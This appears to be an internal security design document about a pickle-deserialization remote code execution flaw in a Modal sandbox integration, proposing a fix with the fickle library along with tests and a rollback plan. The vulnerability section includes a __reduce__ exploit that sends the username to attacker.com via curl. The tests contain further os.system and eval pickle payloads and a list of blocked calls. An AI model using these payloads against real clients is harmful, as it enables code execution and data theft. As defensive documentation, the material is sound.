# Modal Sandbox Security: Pickle-based RCE Prevention

## Executive Summary

We discovered a critical security vulnerability in Modal's use of pickle for serialization/deserialization of Function return values. When untrusted user code in a Modal sandbox returns malicious objects, they can execute arbitrary code on the client machine during deserialization. This document outlines the complete solution using the `fickle` library for safe pickle deserialization.

## The Vulnerability

### How the Attack Works

1. **User submits malicious code** to run in Modal sandbox:
```python
def run(self) -> BlockResult:
    class SimpleExploit:
        def __reduce__(self):
            # This executes during unpickling on the client
            return (os.system, ('curl -X POST "https://attacker.com" -d "uname=$USER"',))
    
    return {"output": SimpleExploit()}
```

2. **Modal pickles the return value** to send back to the client
3. **Client deserializes the pickle**, which triggers the `__reduce__` method
4. **Arbitrary code executes** on the client machine (not in the sandbox!)

### Proof of Vulnerability

The attack was confirmed by observing `uname=yeldarb` in the attacker's logs, proving the code executed on the developer's laptop, not on Modal's servers (which would show `uname=modal`).

## The Solution: Fickle Integration

### What is Fickle?

`fickle` is a Python library that provides safe pickle deserialization by implementing a firewall that blocks dangerous operations like:
- `os.system`, `subprocess` calls
- `eval`, `exec`, `__import__`
- Any other potentially dangerous pickle operations

### Why This Approach?

1. **We cannot trust the sandbox** - It's running untrusted user code
2. **Server-side sanitization won't work** - Malicious users could patch it
3. **Client-side protection is essential** - We must protect the machine receiving data
4. **No fallbacks allowed** - Any fallback to regular pickle is a security hole

## Implementation Plan

### Phase 1: Development & Testing

#### 1.1 Install Dependencies

```bash
pip install fickle
```

#### 1.2 Fork Modal Client Library

Since we're modifying Modal's core serialization, we need to maintain our own fork:

```bash
# Fork modal-client on GitHub
git clone https://github.com/roboflow/modal-client-fork.git
cd modal-client-fork
```

#### 1.3 Implement Fickle Integration

Modify `modal/_serialization.py`:

```python
def deserialize(s: bytes, client) -> Any:
    """Deserializes object and replaces all client placeholders by self."""
    from ._runtime.execution_context import is_local
    
    env = "local" if is_local() else "remote"
    
    try:
        if env == "local":
            # CLIENT SIDE: ALWAYS use fickle for safety - NO EXCEPTIONS
            from fickle import DefaultFirewall
            firewall = DefaultFirewall()
            
            # This will block ALL dangerous operations
            # If this fails, we DON'T fall back - we let it fail
            return firewall.loads(s)
        else:
            # Server side (in Modal containers) - use regular unpickler
            # This is fine because this code runs in the sandbox
            return Unpickler(client, io.BytesIO(s)).load()
    except AttributeError as exc:
        # Handle version mismatches
        if "Can't get attribute '_make_function'" in str(exc):
            raise DeserializationError(
                "Deserialization failed due to a version mismatch between local and remote environments. "
                "Try changing the Python version in your Modal image to match your local Python version. "
            ) from exc
        else:
            raise DeserializationError(
                f"Deserialization failed with an AttributeError, {exc}. This is probably because"
                " you have different versions of a library in your local and remote environments."
            ) from exc
    except ModuleNotFoundError as exc:
        raise DeserializationError(
            f"Deserialization failed because the '{exc.name}' module is not available in the {env} environment."
        ) from exc
    except Exception as exc:
        if env == "remote":
            more = f": {type(exc)}({str(exc)})"
        else:
            more = " (see above for details)"
        raise DeserializationError(
            f"Encountered an error when deserializing an object in the {env} environment{more}."
        ) from exc
```

#### 1.4 Add Tests

Create `tests/test_fickle_security.py`:

```python
import pickle
import os
import pytest
from modal._serialization import deserialize
from unittest.mock import Mock, patch


class TestFickleSecurity:
    """Test suite for fickle-based pickle security."""
    
    def test_blocks_os_system(self):
        """Test that os.system exploits are blocked."""
        class Exploit:
            def __reduce__(self):
                return (os.system, ('echo "EXPLOITED"',))
        
        malicious_pickle = pickle.dumps({"result": Exploit()})
        
        with patch('modal._runtime.execution_context.is_local', return_value=True):
            with pytest.raises(Exception) as exc_info:
                deserialize(malicious_pickle, Mock())
            
            # Should be blocked by fickle
            assert "FirewallError" in str(exc_info.type.__name__) or \
                   "DeserializationError" in str(exc_info.type.__name__)
    
    def test_blocks_eval(self):
        """Test that eval exploits are blocked."""
        class EvalExploit:
            def __reduce__(self):
                return (eval, ('__import__("os").system("echo EXPLOITED")',))
        
        malicious_pickle = pickle.dumps({"result": EvalExploit()})
        
        with patch('modal._runtime.execution_context.is_local', return_value=True):
            with pytest.raises(Exception):
                deserialize(malicious_pickle, Mock())
    
    def test_allows_safe_data(self):
        """Test that safe data structures work normally."""
        safe_data = {
            "result": {
                "numbers": [1, 2, 3],
                "strings": ["hello", "world"],
                "nested": {"key": "value"},
                "boolean": True,
                "none": None
            }
        }
        safe_pickle = pickle.dumps(safe_data)
        
        with patch('modal._runtime.execution_context.is_local', return_value=True):
            result = deserialize(safe_pickle, Mock())
            assert result == safe_data
    
    def test_no_fallback_to_unsafe_pickle(self):
        """Ensure there's no fallback to unsafe pickle for any reason."""
        # Even if fickle fails on something, we should NOT fall back
        class ComplexObject:
            def __init__(self):
                self.data = "test"
            def __reduce__(self):
                return (os.system, ('echo "SHOULD NOT EXECUTE"',))
        
        pickle_data = pickle.dumps(ComplexObject())
        
        with patch('modal._runtime.execution_context.is_local', return_value=True):
            # Should either fail or return safely, but NEVER execute
            try:
                result = deserialize(pickle_data, Mock())
                # If it succeeds, the exploit should not have executed
                assert not isinstance(result, int)  # os.system returns int
            except Exception:
                # Failing is acceptable - better than allowing execution
                pass
```

### Phase 2: Integration with Inference

#### 2.1 Update Requirements

Add to `requirements.txt`:
```
fickle>=0.2.2
# Use our forked Modal client with security fixes
modal @ git+https://github.com/roboflow/modal-client-fork.git@fickle-security
```

#### 2.2 Update Modal Executor

No changes needed to `modal_executor.py` - the security fix is entirely in the Modal client library.

#### 2.3 Add Security Documentation

Create `modal/SECURITY.md`:

```markdown
# Modal Security Considerations

## Pickle Deserialization Protection

This implementation uses `fickle` to prevent pickle-based RCE attacks from untrusted code in Modal sandboxes.

### What's Protected
- Client machines deserializing Modal Function results
- Any pickle data received from Modal sandboxes

### What's Blocked
- os.system, subprocess calls
- eval, exec operations  
- __import__ abuse
- All pickle-based code execution

### Testing Security
Run security tests with:
\`\`\`bash
pytest tests/test_fickle_security.py
\`\`\`

### Important Notes
- NEVER add fallbacks to regular pickle
- If fickle blocks something, it should stay blocked
- Better to break functionality than allow RCE
```

### Phase 3: Migration Strategy

#### 3.1 Handling Breaking Changes

If Modal objects fail to deserialize with fickle:

**Option 1: Use JSON for Custom Blocks**
```python
# Instead of returning Python objects
return {"output": ComplexObject()}

# Return JSON-serializable data
return {"output": {"type": "complex", "data": {...}}}
```

**Option 2: Custom Serialization**
```python
import json
import base64

def safe_serialize(obj):
    """Convert to JSON-safe format."""
    if isinstance(obj, (dict, list, str, int, float, bool, type(None))):
        return obj
    else:
        # For complex objects, use a safe representation
        return {
            "__type": type(obj).__name__,
            "__repr": str(obj)[:1000]
        }

# In Modal function
result = user_function(**inputs)
return {"success": True, "result": safe_serialize(result)}
```

**Option 3: Work with Modal Team**
- Report the security issue to Modal
- Request official support for safe deserialization
- Contribute fickle integration upstream

### Phase 4: Monitoring & Validation

#### 4.1 Security Validation

Create `modal/test_security.py`:

```python
#!/usr/bin/env python3
"""Security validation script for Modal integration."""

import os
import pickle
import tempfile
from pathlib import Path


def test_exploit_blocked():
    """Verify that pickle exploits are blocked."""
    print("Testing pickle exploit prevention...")
    
    # Create a test file that should NOT be created
    test_file = Path(tempfile.gettempdir()) / "modal_exploit_test.txt"
    if test_file.exists():
        test_file.unlink()
    
    # Create exploit that tries to write a file
    class FileWriteExploit:
        def __reduce__(self):
            return (os.system, (f'echo "EXPLOITED" > {test_file}',))
    
    # Test with our Modal integration
    from modal._serialization import deserialize
    from unittest.mock import Mock
    import modal._runtime.execution_context
    
    # Mock client-side environment
    original = modal._runtime.execution_context.is_local
    modal._runtime.execution_context.is_local = lambda: True
    
    try:
        exploit_pickle = pickle.dumps({"result": FileWriteExploit()})
        try:
            deserialize(exploit_pickle, Mock())
            print("❌ SECURITY BREACH: Exploit was not blocked!")
            return False
        except Exception as e:
            if test_file.exists():
                print("❌ SECURITY BREACH: File was created despite error!")
                return False
            print(f"✅ Exploit blocked successfully: {type(e).__name__}")
            return True
    finally:
        modal._runtime.execution_context.is_local = original
        if test_file.exists():
            test_file.unlink()


def test_safe_data_works():
    """Verify that legitimate data still works."""
    print("\nTesting safe data deserialization...")
    
    from modal._serialization import deserialize
    from unittest.mock import Mock
    import modal._runtime.execution_context
    
    original = modal._runtime.execution_context.is_local
    modal._runtime.execution_context.is_local = lambda: True
    
    try:
        safe_data = {
            "result": {
                "value": 42,
                "list": [1, 2, 3],
                "nested": {"deep": {"data": "works"}}
            }
        }
        safe_pickle = pickle.dumps(safe_data)
        result = deserialize(safe_pickle, Mock())
        
        if result == safe_data:
            print("✅ Safe data deserialization works correctly")
            return True
        else:
            print("❌ Safe data was corrupted")
            return False
    except Exception as e:
        print(f"❌ Safe data failed to deserialize: {e}")
        return False
    finally:
        modal._runtime.execution_context.is_local = original


if __name__ == "__main__":
    print("Modal Security Validation")
    print("=" * 50)
    
    exploit_blocked = test_exploit_blocked()
    safe_data_works = test_safe_data_works()
    
    print("\n" + "=" * 50)
    if exploit_blocked and safe_data_works:
        print("✅ ALL SECURITY TESTS PASSED")
        print("\nYour Modal integration is protected against pickle-based RCE")
        exit(0)
    else:
        print("❌ SECURITY TESTS FAILED")
        print("\nDO NOT DEPLOY - Security vulnerability detected!")
        exit(1)
```

#### 4.2 Error Monitoring

Add logging to track deserialization failures:

```python
# In modal_executor.py
import logging

logger = logging.getLogger(__name__)

try:
    result = executor.execute_block.remote(...)
except DeserializationError as e:
    logger.error(f"Deserialization failed - possible blocked exploit: {e}")
    # Log to security monitoring system
    # Alert security team if rate increases
    raise
```

### Phase 5: Long-term Considerations

#### 5.1 Alternative Serialization Formats

Consider migrating away from pickle entirely:

**Option 1: JSON**
- Pros: Safe by default, human-readable
- Cons: Limited type support, no complex objects

**Option 2: MessagePack**
- Pros: Fast, binary, safe
- Cons: Requires schema management

**Option 3: Protocol Buffers**
- Pros: Type-safe, efficient, language-agnostic
- Cons: Requires schema definition

#### 5.2 Contributing Upstream

Work with Modal to implement safe deserialization:

1. Open security issue with Modal team
2. Propose fickle integration
3. Submit PR with tests
4. Help other Modal users secure their applications

#### 5.3 Security Auditing

Regular security audits should include:

1. **Dependency scanning** - Check fickle for vulnerabilities
2. **Penetration testing** - Attempt to bypass protections
3. **Code review** - Ensure no fallbacks added
4. **Runtime monitoring** - Watch for exploitation attempts

## Rollback Plan

If issues arise after deployment:

1. **Immediate Rollback**
```bash
# Revert to standard Modal client
pip uninstall modal
pip install modal==<previous_version>
```

2. **Temporary Mitigation**
```python
# Disable custom Python blocks
os.environ["WORKFLOWS_CUSTOM_PYTHON_EXECUTION_MODE"] = "disabled"
```

3. **Investigation**
- Collect error logs
- Identify breaking changes
- Develop fixes without compromising security

## Success Criteria

The implementation is successful when:

1. ✅ All pickle-based exploits are blocked
2. ✅ Legitimate workflows continue functioning
3. ✅ No performance degradation observed
4. ✅ Security tests pass in CI/CD
5. ✅ No increase in deserialization errors in production

## References

- [Fickle Documentation](https://pypi.org/project/fickle/)
- [Python Pickle Security](https://docs.python.org/3/library/pickle.html#module-pickle)
- [Modal Documentation](https://modal.com/docs)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)